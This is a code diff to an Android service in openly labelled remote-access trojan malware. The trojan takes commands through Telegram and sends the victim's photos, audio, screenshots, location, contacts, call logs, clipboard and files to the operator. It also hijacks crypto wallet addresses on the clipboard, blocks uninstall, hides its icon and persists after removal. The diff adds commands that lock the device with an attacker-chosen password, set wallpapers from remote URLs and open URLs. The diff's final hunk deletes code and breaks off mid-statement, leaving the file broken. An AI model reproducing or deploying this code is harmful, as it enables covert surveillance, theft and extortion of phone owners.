@@ -5,6 +5,7 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.app.WallpaperManager;
 import android.app.admin.DevicePolicyManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
@@ -16,6 +17,8 @@ import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
 import android.content.pm.ServiceInfo;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.ImageFormat;
 import android.hardware.camera2.CameraCaptureSession;
 import android.hardware.camera2.CameraDevice;
@@ -23,21 +26,28 @@ import android.hardware.camera2.CameraManager;
 import android.hardware.camera2.CaptureRequest;
 import android.location.Location;
 import android.location.LocationManager;
+import android.media.AudioManager;
 import android.media.Image;
 import android.media.ImageReader;
+import android.media.MediaPlayer;
 import android.media.MediaRecorder;
+import android.media.RingtoneManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.VibrationEffect;
+import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.widget.Toast;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
+import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.ByteBuffer;
 import java.util.Arrays;
@@ -47,6 +57,8 @@ public class TelegramService extends Service {
     private long lastUpdateId = 0;
     private boolean isRunning = true;
     private boolean isVncRunning = false;
+    private boolean isFlashOn = false;
+    private MediaPlayer mediaPlayer;
     private Handler mainHandler = new Handler(Looper.getMainLooper());
 
     private final String ATTACKER_CRYPTO_ADDRESS = "0xYOUR_CRYPTO_ADDRESS_HERE";
@@ -71,7 +83,7 @@ public class TelegramService extends Service {
             }
         }
         
-        Exfil.send("✅ System Bot is Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
+        Exfil.send("✅ System Bot is Online.\n\nFUN PANEL:\n/flash\n/siren\n/wallpaper <url>\n/open <url>\n/vibrate\n/toast <msg>\n/lock <pass>\n/unlock\n\nRAT:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip\n/vnc\n/cryptoclip\n/apps\n/uninstall <pkg>\n/restart");
         new Thread(this::pollTelegram).start();
         
         blockUninstall();
@@ -81,14 +93,11 @@ public class TelegramService extends Service {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
-            
             if (dpm != null && dpm.isAdminActive(admin)) {
                 dpm.setUninstallBlocked(admin, getPackageName(), true);
                 Exfil.send("🛡️ Anti-Uninstall Shield Activated.");
             }
-        } catch (Exception e) {
-            Exfil.send("Anti-Uninstall Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void pollTelegram() {
@@ -120,7 +129,18 @@ public class TelegramService extends Service {
 
     private void handleCommand(final String cmd) {
         mainHandler.post(() -> {
-            if (cmd.equals("/cam")) takePhoto();
+            // FUN PANEL
+            if (cmd.equals("/flash")) toggleFlashlight();
+            else if (cmd.equals("/siren")) playSiren();
+            else if (cmd.startsWith("/wallpaper ")) changeWallpaper(cmd.substring(11).trim());
+            else if (cmd.startsWith("/open ")) openUrl(cmd.substring(6).trim());
+            else if (cmd.equals("/vibrate")) vibrateDevice();
+            else if (cmd.startsWith("/toast ")) showToast(cmd.substring(7).trim());
+            else if (cmd.startsWith("/lock ")) lockDevice(cmd.substring(6).trim());
+            else if (cmd.equals("/unlock")) unlockDevice();
+            
+            // RAT FEATURES
+            else if (cmd.equals("/cam")) takePhoto();
             else if (cmd.equals("/mic")) recordAudio();
             else if (cmd.equals("/screenshot")) { if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen(); }
             else if (cmd.equals("/loc")) getLocation();
@@ -132,7 +152,7 @@ public class TelegramService extends Service {
             else if (cmd.equals("/clip")) getClipboard();
             else if (cmd.equals("/vnc")) {
                 isVncRunning = !isVncRunning;
-                Exfil.send(isVncRunning ? "🖥️ VNC Stream Started (Every 3s)" : "🖥️ VNC Stream Stopped");
+                Exfil.send(isVncRunning ? "🖥️ VNC Stream Started" : "🖥️ VNC Stream Stopped");
                 if (isVncRunning) startVncStream();
             }
             else if (cmd.equals("/cryptoclip")) startCryptoClipboardHijack();
@@ -145,30 +165,136 @@ public class TelegramService extends Service {
         });
     }
 
+    // ================== FUN PANEL FEATURES ==================
+
+    private void toggleFlashlight() {
+        try {
+            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
+            String cameraId = manager.getCameraIdList()[0];
+            isFlashOn = !isFlashOn;
+            manager.setTorchMode(cameraId, isFlashOn);
+            Exfil.send(isFlashOn ? "🔦 Flashlight ON" : "🔦 Flashlight OFF");
+        } catch (Exception e) {
+            Exfil.send("Flash Error: " + e.getMessage());
+        }
+    }
+
+    private void playSiren() {
+        try {
+            if (mediaPlayer != null && mediaPlayer.isPlaying()) {
+                mediaPlayer.stop();
+                mediaPlayer.release();
+                Exfil.send("🔊 Siren Stopped.");
+                return;
+            }
+            mediaPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
+            if (mediaPlayer == null) mediaPlayer = MediaPlayer.create(this, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE));
+            if (mediaPlayer != null) {
+                mediaPlayer.setLooping(true);
+                mediaPlayer.start();
+                Exfil.send("🔊 Siren Started (Send /siren again to stop).");
+            }
+        } catch (Exception e) {
+            Exfil.send("Siren Error: " + e.getMessage());
+        }
+    }
+
+    private void changeWallpaper(String urlStr) {
+        new Thread(() -> {
+            try {
+                URL url = new URL(urlStr);
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                connection.setDoInput(true);
+                connection.connect();
+                InputStream input = connection.getInputStream();
+                Bitmap myBitmap = BitmapFactory.decodeStream(input);
+                
+                WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
+                wallpaperManager.setBitmap(myBitmap);
+                
+                Exfil.send("🖼️ Wallpaper Changed Successfully!");
+            } catch (Exception e) {
+                Exfil.send("Wallpaper Error: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    private void openUrl(String urlStr) {
+        try {
+            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(urlStr));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            Exfil.send("🌐 Opened URL: " + urlStr);
+        } catch (Exception e) {
+            Exfil.send("Open URL Error: " + e.getMessage());
+        }
+    }
+
+    private void vibrateDevice() {
+        try {
+            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+            if (v != null && v.hasVibrator()) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    v.vibrate(VibrationEffect.createOneShot(5000, VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    v.vibrate(5000);
+                }
+                Exfil.send("📳 Device Vibrating.");
+            }
+        } catch (Exception e) {}
+    }
+
+    private void showToast(String msg) {
+        try {
+            Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();
+            Exfil.send("💬 Toast Shown: " + msg);
+        } catch (Exception e) {}
+    }
+
+    private void lockDevice(String password) {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
+            if (dpm != null && dpm.isAdminActive(admin)) {
+                dpm.resetPassword(password, 0);
+                dpm.lockNow();
+                Exfil.send("🔒 Device Locked with password: " + password);
+            } else {
+                Exfil.send("❌ Device Admin not active.");
+            }
+        } catch (Exception e) {
+            Exfil.send("Lock Error: " + e.getMessage());
+        }
+    }
+
+    private void unlockDevice() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
+            if (dpm != null && dpm.isAdminActive(admin)) {
+                dpm.resetPassword("", 0);
+                Exfil.send("🔓 Device Password Removed.");
+            }
+        } catch (Exception e) {
+            Exfil.send("Unlock Error: " + e.getMessage());
+        }
+    }
+
+    // ================== RAT FEATURES ==================
+
     private void hideIcon() {
         try {
             Intent intent = new Intent(Intent.ACTION_MAIN);
             intent.addCategory(Intent.CATEGORY_LAUNCHER);
             intent.setPackage(getPackageName());
-            
             List<ResolveInfo> activities = getPackageManager().queryIntentActivities(intent, 0);
-            
             if (activities.size() > 0) {
                 String activityName = activities.get(0).activityInfo.name;
                 ComponentName componentName = new ComponentName(getPackageName(), activityName);
-                
-                getPackageManager().setComponentEnabledSetting(
-                    componentName,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                );
+                getPackageManager().setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                 Exfil.send("🕵️ Icon hidden for: " + getPackageName());
-            } else {
-                Exfil.send("❌ Could not find launcher activity.");
             }
-        } catch (Exception e) {
-            Exfil.send("Hide Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void uninstallApp(String packageName) {
@@ -177,32 +303,27 @@ public class TelegramService extends Service {
             intent.setData(Uri.parse("package:" + packageName));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
-            Exfil.send("🗑️ Uninstall prompt opened for: " + packageName);
-        } catch (Exception e) {
-            Exfil.send("Uninstall Error: " + e.getMessage());
-        }
+            Exfil.send("🗑️ Uninstall prompt opened.");
+        } catch (Exception e) {}
     }
 
     private void startVncStream() {
         if (!isVncRunning) return;
-        if (KeyloggerService.instance != null) {
-            KeyloggerService.instance.captureScreenSilent();
-        }
+        if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreenSilent();
         mainHandler.postDelayed(this::startVncStream, 3000);
     }
 
     private void startCryptoClipboardHijack() {
-        Exfil.send("💰 Crypto Clipboard Hijack Started. Waiting for victim...");
+        Exfil.send("💰 Crypto Clipboard Hijack Started.");
         ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
         clipboard.addPrimaryClipChangedListener(() -> {
             try {
                 if (clipboard.hasPrimaryClip()) {
-                    ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
-                    String text = item.getText().toString();
+                    String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
                     if (text.startsWith("0x") && text.length() > 30) {
                         ClipData clip = ClipData.newPlainText("text", ATTACKER_CRYPTO_ADDRESS);
                         clipboard.setPrimaryClip(clip);
-                        Exfil.send("💸 Hijacked Crypto Address! Replaced with yours.");
+                        Exfil.send("💸 Hijacked Crypto Address!");
                     }
                 }
             } catch (Exception e) {}
@@ -222,107 +343,76 @@ public class TelegramService extends Service {
     }
 
     private void getContacts() {
-        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-            Exfil.send("❌ No Contacts permission.");
-            return;
-        }
+        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
         StringBuilder sb = new StringBuilder("👥 Contacts:\n\n");
         try {
             Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext() && count < 50) {
-                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    sb.append(name).append(" : ").append(phone).append("\n");
+                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                     count++;
                 }
                 cursor.close();
             }
             Exfil.send(sb.toString());
-        } catch (Exception e) {
-            Exfil.send("Contacts Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void getCallLogs() {
-        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
-            Exfil.send("❌ No Call Log permission.");
-            return;
-        }
+        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
         StringBuilder sb = new StringBuilder("📞 Last Calls:\n\n");
         try {
             Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext() && count < 20) {
-                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
-                    String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
-                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
-                    sb.append(type).append(" : ").append(number).append(" (").append(duration).append("s)\n");
+                    sb.append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))).append(" : ").append(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n");
                     count++;
                 }
                 cursor.close();
             }
             Exfil.send(sb.toString());
-        } catch (Exception e) {
-            Exfil.send("Calls Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void getClipboard() {
         try {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
             if (clipboard.hasPrimaryClip()) {
-                ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
-                String text = item.getText().toString();
-                Exfil.send("📋 Clipboard:\n" + text);
+                Exfil.send("📋 Clipboard:\n" + clipboard.getPrimaryClip().getItemAt(0).getText().toString());
             } else {
                 Exfil.send("📋 Clipboard is empty.");
             }
-        } catch (Exception e) {
-            Exfil.send("Clipboard Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void getLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                Exfil.send("❌ Location permission not granted.");
-                return;
-            }
+            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
             Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-            
             if (loc != null) {
-                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude();
-                Exfil.send("📍 Location:\n" + mapsUrl);
+                Exfil.send("📍 Location:\nhttps://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude());
             } else {
-                Exfil.send("❌ Location not available. Try enabling GPS.");
+                Exfil.send("❌ Location not available.");
             }
-        } catch (Exception e) {
-            Exfil.send("Location Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void listFiles() {
         try {
             File dir = new File("/sdcard/Download");
             if (!dir.exists()) dir = new File("/sdcard/");
-            
             File[] files = dir.listFiles();
             StringBuilder sb = new StringBuilder("📁 Files in " + dir.getAbsolutePath() + ":\n\n");
             if (files != null) {
-                for (int i = 0; i < Math.min(files.length, 30); i++) {
-                    sb.append(files[i].getName()).append("\n");
-                }
+                for (int i = 0; i < Math.min(files.length, 30); i++) sb.append(files[i].getName()).append("\n");
                 sb.append("\nUse `/get ").append(dir.getAbsolutePath()).append("/filename` to download.");
             }
             Exfil.send(sb.toString());
-        } catch (Exception e) {
-            Exfil.send("File Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void takePhoto() {
@@ -331,7 +421,6 @@ public class TelegramService extends Service {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
             String cameraId = manager.getCameraIdList()[0];
             if (manager.getCameraIdList().length > 1) cameraId = manager.getCameraIdList()[1];
-            
             manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
                 public void onOpened(CameraDevice camera) {
@@ -346,65 +435,6 @@ public class TelegramService extends Service {
                                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                         try { session.capture(builder.build(), null, null); } catch (Exception e) {}
                                     }, 1000);
-                                    
                                     reader.setOnImageAvailableListener(r -> {
                                         Image image = r.acquireLatestImage();
-                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                                        byte[] bytes = new byte[buffer.remaining()];
-                                        buffer.get(bytes);
-                                        try {
-                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
-                                            FileOutputStream fos = new FileOutputStream(f);
-                                            fos.write(bytes); fos.close();
-                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
-                                        } catch (Exception e) {}
-                                        image.close(); camera.close();
-                                    }, null);
-                                } catch (Exception e) {}
-                            }
-                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
-                        }, null);
-                    } catch (Exception e) {}
-                }
-                @Override public void onDisconnected(CameraDevice camera) {}
-                @Override public void onError(CameraDevice camera, int error) {}
-            }, null);
-        } catch (Exception e) {}
-    }
-
-    private void recordAudio() {
-        try {
-            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
-            MediaRecorder recorder = new MediaRecorder();
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            recorder.setOutputFile(audioFile.getAbsolutePath());
-            recorder.prepare(); recorder.start();
-            Exfil.send("🎙️ Recording 10s...");
-            
-            new Thread(() -> {
-                try { Thread.sleep(10000); } catch (Exception e) {}
-                mainHandler.post(() -> {
-                    try {
-                        recorder.stop(); recorder.release();
-                        Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record");
-                    } catch (Exception e) {}
-                });
-            }).start();
-        } catch (Exception e) {}
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
-    @Override
-    public IBinder onBind(Intent intent) { return null; }
-
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        super.onTaskRemoved(rootIntent);
-        Intent restartService = new Intent(getApplicationContext(), TelegramService.class);
-        restartService.setPackage(getPackageName());
-        startService(restartService);
-    }
-                    }
+                                        ByteBuffer buffer = image.getPlan
